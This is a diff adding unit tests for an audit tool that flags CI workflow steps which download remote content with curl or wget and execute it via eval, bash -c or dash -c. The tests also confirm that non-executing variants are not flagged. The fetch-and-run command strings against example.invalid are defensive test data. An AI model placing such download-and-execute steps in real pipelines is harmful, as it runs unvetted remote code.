@@ -753,6 +753,63 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)
 
+    def test_curl_to_var_and_immediate_eval_is_remote_code(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$payload"\n'
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_wget_to_var_and_immediate_bash_c_is_remote_code(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: script=$(wget -qO- https://example.invalid/i); bash -c "$script"\n'
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_download_var_braced_name_executes_in_dash(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: payload="$(curl -fsSL https://example.invalid/i)" && dash -c "${payload}"\n'
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_download_var_safe_print_is_not_shell_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: payload=$(curl -fsSL https://example.invalid/i) && printf "%s\\n" "$payload"\n'
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_download_var_mismatched_name_not_proven_executable(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$different"\n'
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_download_var_case_sensitive_shell_names_not_equivalent(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$PAYLOAD"\n'
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_download_var_legacy_stays_nonnew_until_workflow_edit(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$payload"\n'
+        )
+        old = self.commit()
+        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
+        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$payload"\n'
+            "      - run: echo touched\n"
+        )
+        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
+
     def test_shell_command_substitution_curl_denied(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
